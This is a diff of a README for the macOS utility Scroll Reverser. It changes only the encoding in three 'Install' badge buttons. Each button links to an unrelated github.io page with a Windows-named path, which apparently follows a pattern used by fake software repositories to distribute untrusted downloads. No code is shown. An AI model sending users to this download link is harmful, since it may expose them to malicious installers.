@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Scroll Reverser](https://img.shields.io/badge/⬇_Install_Scroll%20Reverser-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Scroll Reverser](https://img.shields.io/badge/⬇_Install_Scroll+Reverser-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Scroll Reverser is a free macOS utility that independently reverses scrolling di
 
 <div align="center">
 
-[![⬇ Install Scroll Reverser](https://img.shields.io/badge/⬇_Install_Scroll%20Reverser-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Scroll Reverser](https://img.shields.io/badge/⬇_Install_Scroll+Reverser-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Scroll Reverser is a free macOS utility that independently reverses scrolling di
 
 <div align="center">
 
-[![⬇ Install Scroll Reverser](https://img.shields.io/badge/⬇_Install_Scroll%20Reverser-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Scroll Reverser](https://img.shields.io/badge/⬇_Install_Scroll+Reverser-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
